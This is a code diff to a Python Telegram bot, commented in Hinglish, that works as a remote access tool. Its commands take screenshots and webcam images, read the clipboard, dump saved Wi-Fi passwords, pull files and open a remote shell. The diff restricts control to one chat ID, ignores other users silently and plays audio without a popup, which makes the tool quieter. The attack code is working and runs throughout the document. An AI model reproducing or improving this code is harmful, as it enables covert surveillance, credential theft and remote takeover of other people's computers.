@@ -10,6 +10,7 @@ import subprocess
 import threading
 import requests
 import pyperclip
+import pygame # Audio play karne ke liye (No popup)
 from gtts import gTTS
 from pathlib import Path
 from functools import wraps
@@ -23,13 +24,12 @@ load_dotenv()
 # ==============================
 
 TOKEN = os.getenv("TOKEN")
-BOT_PASSWORD = os.getenv("BOT_PASSWORD")
+ALLOWED_CHAT_ID = int(os.getenv("CHAT_ID"))  # Sirf yahi Chat ID access kar sakta hai
 
 bot = telebot.TeleBot(TOKEN)
 OS = platform.system()  # 'Windows', 'Linux', 'Darwin'
 cd = Path.home()
 
-authenticated_users = set()
 user_states = {}
 
 STATE_NORMAL = 1
@@ -39,15 +39,17 @@ STATE_SHELL = 2
 # HELPERS
 # ==============================
 
-def is_authenticated(user_id):
-    return user_id in authenticated_users
+def is_authorized(chat_id):
+    """Check karo ki message allowed Chat ID se aa raha hai ya nahi."""
+    return chat_id == ALLOWED_CHAT_ID
 
 
-def authenticate_required(func):
+def authorize_required(func):
+    """Decorator: sirf allowed Chat ID ko access deta hai."""
     @wraps(func)
     def wrapper(message, *args, **kwargs):
-        if not is_authenticated(message.from_user.id):
-            bot.send_message(message.chat.id, "Please authenticate with /auth [password]")
+        if not is_authorized(message.chat.id):
+            # Unauthorized users ko koi response nahi — silently ignore
             return
         return func(message, *args, **kwargs)
     return wrapper
@@ -162,16 +164,25 @@ def get_clipboard_content():
 
 
 def play_text(text, lang="en"):
-    tts = gTTS(text=text, lang=lang)
-    with NamedTemporaryFile(suffix=".mp3", delete=False) as tmp:
-        tts.write_to_fp(tmp)
-        tmp_path = tmp.name
-    if OS == "Windows":
-        subprocess.run(["start", tmp_path], shell=True)
-    elif OS == "Darwin":
-        subprocess.run(["open", tmp_path])
-    else:
-        subprocess.run(["xdg-open", tmp_path])
+    try:
+        tts = gTTS(text=text, lang=lang)
+        with NamedTemporaryFile(suffix=".mp3", delete=False) as tmp:
+            tts.write_to_fp(tmp)
+            tmp_path = tmp.name
+
+        pygame.mixer.init()
+        pygame.mixer.music.load(tmp_path)
+        pygame.mixer.music.play()
+
+        while pygame.mixer.music.get_busy():
+            time.sleep(0.1)
+
+        pygame.mixer.music.unload()
+        if os.path.exists(tmp_path):
+            os.remove(tmp_path)
+
+    except Exception as e:
+        print(f"Speech Error: {e}")
 
 
 def get_wifi_passwords():
@@ -189,7 +200,6 @@ def get_wifi_passwords():
                     profiles.append(f"SSID: {ssid.group(1)} | PASS: {key.group(1) if key else 'N/A'}")
             shutil.rmtree(export_folder)
         elif OS == "Darwin":
-            # macOS version
             result = subprocess.run(["security", "find-generic-password", "-ga", "Wi-Fi"], capture_output=True, text=True)
             profiles.append(result.stdout)
         elif OS == "Linux":
@@ -204,44 +214,31 @@ def get_wifi_passwords():
 # BOT COMMANDS
 # ==============================
 
-@bot.message_handler(commands=["auth"])
-def authenticate(message):
-    user_id = message.from_user.id
-    parts = message.text.split()
-    if len(parts) != 2:
-        bot.send_message(user_id, "Usage: /auth [password]")
-        return
-    if parts[1] == BOT_PASSWORD:
-        authenticated_users.add(user_id)
-        bot.send_message(user_id, "✅ Authenticated successfully.")
-    else:
-        bot.send_message(user_id, "❌ Wrong password.")
-
-
 @bot.message_handler(commands=["start"])
-@authenticate_required
+@authorize_required
 def start(message):
     bot.send_message(
         message.chat.id,
+        "✅ Connected! Your Chat ID verified.\n\n"
         "Commands:\n"
         "/screen - screenshot\n"
+        "/webcam - capture webcam\n"
         "/sys - system info\n"
         "/ip - public IP\n"
         "/cd [dir] - change folder\n"
         "/ls - list files\n"
         "/upload [path] - get file\n"
         "/clipboard - get clipboard\n"
-        "/speech [text] - play speech\n"
+        "/speech [hi/en] [text] - play speech\n"
         "/wifi - get Wi-Fi info\n"
         "/lock - lock PC\n"
         "/shutdown - shutdown PC\n"
-        "/shell - open remote shell\n"
-        "/webcam - capture webcam"
+        "/shell - open remote shell"
     )
 
 
 @bot.message_handler(commands=["screen"])
-@authenticate_required
+@authorize_required
 def screenshot_cmd(message):
     path = cd / "screenshot.png"
     take_screenshot(path)
@@ -251,19 +248,19 @@ def screenshot_cmd(message):
 
 
 @bot.message_handler(commands=["sys"])
-@authenticate_required
+@authorize_required
 def sys_info_cmd(message):
     bot.send_message(message.chat.id, get_system_info())
 
 
 @bot.message_handler(commands=["ip"])
-@authenticate_required
+@authorize_required
 def ip_cmd(message):
     bot.send_message(message.chat.id, get_public_ip())
 
 
 @bot.message_handler(commands=["ls"])
-@authenticate_required
+@authorize_required
 def list_dir_cmd(message):
     try:
         contents = [p.name for p in cd.iterdir()]
@@ -273,7 +270,7 @@ def list_dir_cmd(message):
 
 
 @bot.message_handler(commands=["cd"])
-@authenticate_required
+@authorize_required
 def cd_cmd(message):
     global cd
     args = message.text.split(maxsplit=1)
@@ -289,7 +286,7 @@ def cd_cmd(message):
 
 
 @bot.message_handler(commands=["upload"])
-@authenticate_required
+@authorize_required
 def upload_cmd(message):
     args = message.text.split(maxsplit=1)
     if len(args) < 2:
@@ -304,25 +301,38 @@ def upload_cmd(message):
 
 
 @bot.message_handler(commands=["clipboard"])
-@authenticate_required
+@authorize_required
 def clipboard_cmd(message):
     clip = get_clipboard_content()
     bot.send_message(message.chat.id, clip or "Clipboard empty or unsupported.")
 
 
 @bot.message_handler(commands=["speech"])
-@authenticate_required
+@authorize_required
 def speech_cmd(message):
-    text = message.text.replace("/speech", "").strip()
-    if not text:
-        bot.send_message(message.chat.id, "Usage: /speech [text]")
+    args = message.text.split(maxsplit=2)
+
+    if len(args) < 2:
+        bot.send_message(message.chat.id, "Usage: /speech [hi/en] [text]\nExample: /speech hi Namaste")
         return
-    threading.Thread(target=play_text, args=(text,), daemon=True).start()
-    bot.send_message(message.chat.id, "Speaking... 🎤")
+
+    if args[1].lower() in ["hi", "en"]:
+        lang = args[1].lower()
+        text = args[2] if len(args) > 2 else ""
+    else:
+        lang = "en"
+        text = " ".join(args[1:])
+
+    if not text:
+        bot.send_message(message.chat.id, "Bolne ke liye kuch likhein.")
+        return
+
+    threading.Thread(target=play_text, args=(text, lang), daemon=True).start()
+    bot.send_message(message.chat.id, f"🔊 {lang.upper()} mein bol raha hoon...")
 
 
 @bot.message_handler(commands=["lock"])
-@authenticate_required
+@authorize_required
 def lock_cmd(message):
     if lock_screen():
         bot.send_message(message.chat.id, "🔒 Screen locked.")
@@ -331,7 +341,7 @@ def lock_cmd(message):
 
 
 @bot.message_handler(commands=["shutdown"])
-@authenticate_required
+@authorize_required
 def shutdown_cmd(message):
     if shutdown_computer():
         bot.send_message(message.chat.id, "💻 Shutting down...")
@@ -340,7 +350,7 @@ def shutdown_cmd(message):
 
 
 @bot.message_handler(commands=["webcam"])
-@authenticate_required
+@authorize_required
 def webcam_cmd(message):
     img = cd / "webcam.jpg"
     result = capture_webcam_image(img)
@@ -353,13 +363,13 @@ def webcam_cmd(message):
 
 
 @bot.message_handler(commands=["wifi"])
-@authenticate_required
+@authorize_required
 def wifi_cmd(message):
     bot.send_message(message.chat.id, get_wifi_passwords())
 
 
 @bot.message_handler(commands=["shell"])
-@authenticate_required
+@authorize_required
 def shell_cmd(message):
     user_states[message.from_user.id] = STATE_SHELL
     bot.send_message(message.chat.id, "Shell mode active. Type 'exit' to quit.")
@@ -370,7 +380,7 @@ def get_user_state(uid):
 
 
 @bot.message_handler(func=lambda msg: get_user_state(msg.from_user.id) == STATE_SHELL)
-@authenticate_required
+@authorize_required
 def shell_input(message):
     uid = message.from_user.id
     cmd = message.text.strip()
@@ -393,6 +403,7 @@ def shell_input(message):
 
 if __name__ == "__main__":
     print(f"Bot running on {OS} ...")
+    print(f"Authorized Chat ID: {ALLOWED_CHAT_ID}")
     while True:
         try:
             bot.infinity_polling()
